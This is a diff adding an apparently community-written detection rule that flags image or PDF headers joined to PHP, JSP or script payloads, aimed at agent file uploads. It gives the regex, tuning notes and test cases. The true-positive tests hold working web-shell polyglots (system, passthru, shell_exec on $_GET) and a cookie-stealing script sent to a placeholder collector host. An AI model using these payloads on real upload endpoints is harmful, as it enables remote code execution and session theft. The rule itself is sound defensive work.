@@ -1,0 +1,279 @@
+title: "Image-Header Polyglot: Magic Bytes Adjacent to a Server-Side Script Payload"
+id: ATR-2026-02644
+rule_version: 1
+status: "experimental"
+description: >
+  Detects content that opens with an IMAGE (or PDF) magic header, follows it
+  IMMEDIATELY with a server-side script opener -- `GIF89a<?php`, `%PDF-1.4 <?php`,
+  `GIF87a<script`, `GIF89a<%` -- and then carries an actual execution primitive.
+  This is the shape of an upload built to pass a content-type or magic-byte
+  check and still execute once it lands. CVE-2025-55743 (UnoPim) is the
+  reference case: client-side-only validation, so the file that reaches disk is
+  a valid-looking image whose body is PHP.
+
+  THREE PARTS, EACH FORCED BY A MEASUREMENT (2026-08-24 adversarial review,
+  24 benign probes run through the shipped engine).
+    1. ADJACENCY. The bridge between header and opener admits only
+       NON-ALPHABETIC filler -- space, tab, semicolon, control and high bytes,
+       never a newline and never a letter. The published version instead
+       forbade quotes/commas/newlines and capped the bridge at 16 characters,
+       on the theory that a real polyglot is one byte string. Ordinary prose
+       fits in 16 characters without a quote or a comma, so it fired on a
+       library changelog, a QA runbook, a forensic tool's output, a markdown
+       magic-number table and its Traditional Chinese equivalent.
+    2. PAYLOAD. An execution primitive must appear within 60 characters of the
+       opener. Without it, a tab-separated signature table, a space-aligned
+       reference table and a WAF denylist (`GIF89a;<?php;<%@;<script`) still
+       fired -- all of them documentation and configuration that DEFENDS
+       against this attack.
+    3. The double-extension condition was REMOVED, not repaired. See below.
+
+  WHY THE DOUBLE-EXTENSION CONDITION IS GONE. It matched `<word>.<exec-ext>.<image-ext>`
+  and could not be separated from ordinary derived-artifact naming, because the
+  two are the same string. `screenshots/checkout.aspx.png` (a Playwright
+  artifact named after the page under test), `docs/img/dashboard.jsp.png`,
+  `wireframes/cart.asp.svg`, `report.cgi.csv` and `print/invoice.phtml.pdf` all
+  fired, and the rule's own true positive for that condition was
+  `saved report.aspx.png to the public assets directory` -- indistinguishable.
+  Naming a screenshot, export or rendered PDF after its source page is standard
+  practice, and `pl` (the Polish ISO-639-1 code) collided with the whole
+  localized-documentation family: `user-guide.pl.pdf`, `dashboard.pl.png`,
+  `LICENSE.pl.txt`, `strings.pl.csv`, `architecture.pl.svg`, `umowa.pl.docx`.
+  Double extensions are therefore a STATED GAP for this rule; detecting them
+  needs upload-path context (the parameter the filename arrives in and the
+  directory it lands in), not a filename pattern.
+
+  RESIDUAL. Text quoting a COMPLETE polyglot verbatim -- header, opener and
+  execution primitive together, as an advisory or this rule's own test cases --
+  IS the payload and fires. That is inherent to a byte-level signature and is
+  reported, not engineered away. Partial quotations no longer fire, which is
+  what keeps the residual narrow.
+author: "ATR Community"
+date: "2026/08/23"
+schema_version: "0.1"
+detection_tier: pattern
+maturity: "test"
+severity: high
+
+references:
+  cve:
+    - "CVE-2025-55743"
+    - "CVE-2008-2742"
+  cwe:
+    - CWE-434
+    - CWE-646
+  owasp_llm:
+    - "LLM05:2025"
+  owasp_agentic:
+    - "ASI03:2026"
+  mitre_atlas:
+    - "AML.T0053 - AI Agent Tool Invocation"
+  mitre_attack:
+    - "T1505.003 - Server Software Component: Web Shell"
+  external:
+    - "https://nvd.nist.gov/vuln/detail/CVE-2025-55743"
+
+compliance:
+  owasp_agentic:
+    - id: ASI03:2026
+      context: "An agent that writes or forwards this content plants an execution primitive on the target host, converting file-write authority into code-execution authority."
+      strength: primary
+  owasp_llm:
+    - id: LLM05:2025
+      context: "Improper output handling: content the agent produces or relays is treated as an image by validation and as code by the server that stores it."
+      strength: primary
+  eu_ai_act:
+    - article: "15"
+      context: "Article 15 accuracy and robustness: a system that passes attacker content through a validation layer it defeats is not robust, and detections here evidence attempts on that path."
+      strength: primary
+    - article: "9"
+      context: "File upload through an agent is a documented risk source; these detections are the Article 9 monitoring control for it."
+      strength: secondary
+  nist_ai_rmf:
+    - function: Manage
+      subcategory: MG.2.3
+      context: "Runtime treatment for the risk that agent-mediated file writes carry executable payloads disguised as media."
+      strength: primary
+    - function: Map
+      subcategory: MP.5.1
+      context: "Characterises content-type spoofing as a distinct risk from prompt injection in the agent's write path."
+      strength: secondary
+    - function: Measure
+      subcategory: "MS.2.7"
+      context: "Detection events document the security of the upload path that MEASURE 2.7 asks to be evidenced."
+      strength: secondary
+  iso_42001:
+    - clause: "8.1"
+      context: "Clause 8.1 operational control over what the system writes to externally provided storage."
+      strength: primary
+    - clause: "8.4"
+      context: "Impact assessment under clause 8.4 must account for artifacts the system stores being executed by the host that stores them."
+      strength: secondary
+    - clause: "6.2"
+      context: "Preventing the system from becoming a delivery vehicle for executable content is an AIMS objective under clause 6.2."
+      strength: secondary
+
+tags:
+  category: privilege-escalation
+  subcategory: content-type-polyglot
+  scan_target: both
+  confidence: medium
+
+agent_source:
+  type: mcp_exchange
+  framework:
+    - any
+  provider:
+    - any
+
+detection:
+  conditions:
+    # Image/PDF magic header, then a server-side script opener separated only by
+    # NON-ALPHABETIC filler (space, tab, semicolon, control or high bytes -- never
+    # a newline, never a letter), and then, within 60 characters, an actual
+    # execution primitive. All three parts are required. See false_positives for
+    # the measurements that forced each one.
+    - field: content
+      operator: regex
+      value: '(?:GIF8[79]a|%PDF-1\.[0-9]|\x89PNG|\\x89PNG|\xff\xd8\xff|\\xff\\xd8\\xff)(?:[; \t\x00-\x08\x0b\x0c\x80-\xff]{0,6}(?:<\?php|<\?=|<%@|<script|<jsp:|#!\s{0,2}/(?:bin|usr))|<%[ \t=])[^\r\n]{0,60}(?:system|passthru|shell_exec|proc_open|popen|\bexec\b|\beval\b|assert|base64_decode|file_put_contents|move_uploaded_file|fetch\s{0,2}\(|document\.cookie|getRuntime|\$_(?:GET|POST|REQUEST|COOKIE|SERVER|FILES))'
+      description: "Image or PDF magic header, a server-side script opener adjacent to it, and an execution primitive in the body"
+  condition: any
+  false_positives:
+    - "Security research or advisory text reproducing a COMPLETE CVE-2025-55743 payload -- header, opener AND execution primitive together. This is the one residual and it is inherent to a byte-level signature: the quoted payload is byte-identical to the payload. Partial quotations no longer fire, which is what makes the residual narrow."
+    - "MEASURED AND FIXED 2026-08-24 (adversarial review, 24 benign probes). The published version fired on 15 of 16 first-wave probes. The author's premise -- that a bridge forbidding quotes, commas and newlines and capped at 16 characters implies one byte string -- was false: ordinary prose fits inside it. These all fired and are now clean: 'added GIF89a and <script sniffing to the content-type detector' (library changelog); 'The PNG signature \\x89PNG and the <?php opener are both short byte strings'; 'upload %PDF-1.4 with <script> annotations and confirm the viewer strips JavaScript' (QA runbook); 'File.write(dest, \"%PDF-1.4 <%= body %>\")' (ERB template emitting a PDF header); 'signatures found: GIF89a at 0x0; #!/bin/sh at 0x40' (forensic tool output); '| GIF89a | image/gif | <?php | text/x-php |' (markdown reference table -- pipes are neither quotes nor commas); and the same table in Traditional Chinese. Fixed by forbidding LETTERS in the bridge rather than counting characters."
+    - "MEASURED AND FIXED 2026-08-24, second wave. With prose excluded, three signature-reference forms still fired because their separators are punctuation: a tab-separated magic-number table, a space-aligned two-column table, and 'deny_signatures = GIF89a;<?php;<%@;<script' (a WAF denylist -- byte-identical to the classic polyglot). Fixed by requiring an execution primitive (system/passthru/shell_exec/exec/eval/$_GET/document.cookie/getRuntime/...) within 60 characters of the opener. A reference table names openers; a polyglot carries a payload."
+    - "STATED GAP: a polyglot whose payload uses none of the listed execution primitives (a pure data-staging web shell, or an obfuscated dispatcher) is not detected. That is the price of the second-wave fix and is preferred to firing on every WAF denylist."
+    - "STATED GAP: raw binary GIF header bytes above \\x7f are allowed in the bridge, but a genuine binary upload arriving base64-encoded is not decoded here and is not detected."
+
+response:
+  actions:
+    - alert
+  auto_response_threshold: high
+  message_template: >
+    [ATR-2026-02644] Content whose image/PDF magic header is immediately
+    followed by a server-side script opener AND an execution primitive. This is
+    an upload built to pass content-type validation and execute after storage.
+    Reference: CVE-2025-55743. Do not write this file to a served directory.
+
+confidence: 70
+test_cases:
+  true_positives:
+    - input: '{"tool":"upload_file","arguments":{"name":"avatar.php","data":"GIF89a<?php system($_GET[0]); ?>"}}'
+      expected: triggered
+      description: "GIF-header polyglot carrying a PHP web shell"
+    - input: '{"tool":"write_file","arguments":{"path":"/var/www/html/u/x.phtml","content":"GIF89a;<?php passthru($_REQUEST[0]); ?>"}}'
+      expected: triggered
+      description: "Semicolon-separated GIF89a polyglot, the classic form"
+    - input: 'body = %PDF-1.4 <?php echo shell_exec($_GET[0]); ?>'
+      expected: triggered
+      description: "PDF-header polyglot"
+    - input: 'bytes: GIF87a<script>fetch("https://collector.example/?c="+document.cookie)</script>'
+      expected: triggered
+      description: "Old GIF signature followed by client-side script"
+    - input: 'upload payload: GIF89a<% Runtime.getRuntime().exec(request.getParameter("c")); %>'
+      expected: triggered
+      description: "GIF header followed by a JSP scriptlet"
+  true_negatives:
+    - input: "Magic numbers we check: GIF89a (image/gif), %PDF-1.4 (application/pdf), and for source files the PHP opening tag <?php."
+      expected: not_triggered
+      description: "Prose naming both signatures -- the separation is far longer than a polyglot's"
+    - input: "const SIGNATURES = { gif: 'GIF89a', pdf: '%PDF-', php: '<?php', html: '<!DOCTYPE' };"
+      expected: not_triggered
+      description: "Magic-number lookup table -- quotes and commas sit between the tokens"
+    - input: "const GIF_HEADER = 'GIF89a'; const PHP_OPEN = '<?php'; expect(sniff(buf)).toBe('image/gif');"
+      expected: not_triggered
+      description: "Test fixture assigning both constants on one line"
+    - input: '{"tool":"write_file","arguments":{"path":"src/index.php","content":"<?php require bootstrap.php;"}}'
+      expected: not_triggered
+      description: "An ordinary PHP source file with no image header"
+    - input: 'Generated thumbnail: GIF89a followed by 1024 bytes of LZW data; served from /static/thumbs/.'
+      expected: not_triggered
+      description: "Description of a genuine GIF being produced"
+    - input: 'Attachments: quarterly.pdf, chart.png, notes.txt, deploy.sh, migrate.pl'
+      expected: not_triggered
+      description: "Ordinary attachment list including a .pl script -- no double extension"
+    - input: 'Renamed report.php to report.php.bak before the deploy; the backup is not served.'
+      expected: not_triggered
+      description: ".bak is not an image or document extension, so the double-extension half does not claim it"
+    - input: 'file(1) output: image.gif: GIF image data, version 89a, 200 x 200'
+      expected: not_triggered
+      description: "file(1) identifying a real GIF"
+    - input: "Content-Type sniffing order: check GIF89a first, then %PDF-, then fall back to text/plain; never trust the declared type."
+      expected: not_triggered
+      description: "Implementation note listing the signatures in order"
+    - input: 'docs/upload.md documents that .php, .phtml and .jsp uploads are rejected and images are re-encoded to .png before storage.'
+      expected: not_triggered
+      description: "Hardening documentation listing every dangerous extension this rule watches"
+    - input: 'Release assets: user-guide.en.pdf, user-guide.de.pdf, user-guide.pl.pdf, user-guide.ja.pdf'
+      expected: not_triggered
+      description: 'adversarial review 2026-08-24: localized manuals; pl = Polish ISO-639-1 code, not Perl'
+    - input: 'docs/screenshots/dashboard.pl.png regenerated by the i18n screenshot job'
+      expected: not_triggered
+      description: 'adversarial review 2026-08-24: localized screenshot in an i18n docs repo'
+    - input: 'Added LICENSE.pl.txt and LICENSE.cs.txt translations contributed by the community.'
+      expected: not_triggered
+      description: 'adversarial review 2026-08-24: CHANGELOG entry, Polish licence translation'
+    - input: 'weblate export finished: strings.pl.csv (4821 rows), strings.uk.csv (4820 rows)'
+      expected: not_triggered
+      description: 'adversarial review 2026-08-24: translation platform export'
+    - input: 'assets/architecture.pl.svg is stale versus architecture.en.svg; re-run make diagrams'
+      expected: not_triggered
+      description: 'adversarial review 2026-08-24: CI warning about a localized diagram'
+    - input: 'Attached: umowa.pl.docx and contract.en.docx for signature.'
+      expected: not_triggered
+      description: 'adversarial review 2026-08-24: bilingual contract attachments'
+    - input: 'Download config.php.txt, rename it to config.php and edit the DB credentials.'
+      expected: not_triggered
+      description: 'adversarial review 2026-08-24: hosting docs shipping a PHP sample as .txt so the server will not execute it'
+    - input: 'The legacy importer is published as install.pl.txt so browsers render it instead of downloading.'
+      expected: not_triggered
+      description: 'adversarial review 2026-08-24: Perl script published with a .txt suffix'
+    - input: 'v2.3.0: added GIF89a and <script sniffing to the content-type detector; dropped the deprecated sniffOrder option.'
+      expected: not_triggered
+      description: 'adversarial review 2026-08-24: file-type detection library changelog'
+    - input: 'The PNG signature \x89PNG and the <?php opener are both short byte strings, so a naive sniffer confuses them.'
+      expected: not_triggered
+      description: 'adversarial review 2026-08-24: ordinary prose about file signatures'
+    - input: 'QA step 4: upload %PDF-1.4 with <script> annotations and confirm the viewer strips JavaScript before rendering.'
+      expected: not_triggered
+      description: 'adversarial review 2026-08-24: PDF-viewer QA runbook step'
+    - input: 'File.write(dest, "%PDF-1.4 <%= body %>")'
+      expected: not_triggered
+      description: 'adversarial review 2026-08-24: ERB template that emits a raw PDF header'
+    - input: 'signatures found: GIF89a at 0x0; #!/bin/sh at 0x40 - the archive is a shar wrapper'
+      expected: not_triggered
+      description: 'adversarial review 2026-08-24: forensic signature-scan tool output'
+    - input: '| GIF89a | image/gif | <?php | text/x-php |'
+      expected: not_triggered
+      description: 'adversarial review 2026-08-24: markdown reference table of magic bytes and openers, pipes not commas'
+    - input: '檔案簽章對照:GIF89a 是 GIF;<?php 是 PHP 開頭標籤,兩者長度不同。'
+      expected: not_triggered
+      description: 'adversarial review 2026-08-24: non-English file-signature reference'
+    - input: 'UPLOAD_DENY_EXT=php,phtml,phar,jsp,asp,aspx,cgi,pl
+UPLOAD_ALLOW_EXT=jpg,png,gif,pdf'
+      expected: not_triggered
+      description: 'adversarial review 2026-08-24: .env.example hardening config listing both extension sets'
+    - input: 'GIF89a	<?php	php-open	GIF87a	<%@	jsp-directive'
+      expected: not_triggered
+      description: 'adversarial review 2026-08-24: TSV magic-number reference table, tab separated'
+    - input: 'GIF89a   <?php   both openers are checked by the sniffer'
+      expected: not_triggered
+      description: 'adversarial review 2026-08-24: space-aligned two-column reference table'
+    - input: 'deny_signatures = GIF89a;<?php;<%@;<script'
+      expected: not_triggered
+      description: 'adversarial review 2026-08-24: semicolon-separated signature denylist in a WAF config'
+    - input: 'playwright artifacts written: screenshots/checkout.aspx.png screenshots/login.aspx.png'
+      expected: not_triggered
+      description: 'adversarial review 2026-08-24: e2e screenshots named after the server page under test'
+    - input: 'docs/img/dashboard.jsp.png needs a retake after the nav redesign'
+      expected: not_triggered
+      description: 'adversarial review 2026-08-24: documentation screenshot named after the JSP page'
+    - input: 'wireframes/cart.asp.svg exported from Figma'
+      expected: not_triggered
+      description: 'adversarial review 2026-08-24: design export named after the legacy ASP page'
+    - input: 'archived report.cgi.csv from the nightly export job'
+      expected: not_triggered
+      description: 'adversarial review 2026-08-24: CSV produced by a CGI endpoint, named after it'
+    - input: 'print/invoice.phtml.pdf rendered by wkhtmltopdf from the phtml template'
+      expected: not_triggered
+      description: 'adversarial review 2026-08-24: PDF rendered from a template, named after the template'
